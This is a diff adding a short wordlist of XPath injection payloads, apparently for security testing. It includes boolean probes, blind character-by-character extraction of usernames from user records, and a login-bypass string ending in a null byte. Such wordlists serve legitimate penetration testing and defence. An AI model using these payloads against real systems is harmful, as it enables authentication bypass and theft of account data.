@@ -1,0 +1,12 @@
+count(/child::node())
+x' or name()='username' or 'x'='y
+' and count(/*)=1 and '1'='1
+' and count(/@*)=1 and '1'='1
+' and count(/comment())=1 and '1'='1
+substring(//user[userid=5]/username,2,1)=CHAR_HERE
+substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
+and string-to-codepoints(substring(name(/*[1]/*[1]/*),1,1)) = 105
+and substring(name(/*[1]/*[1]),1,1) = "a"
+and name(/*[1]) = "root"
+string(//user[name/text()='+VAR_USER+' and password/text()='+VAR_PASSWD+']/account/text())
+Username: ' or 1]%00
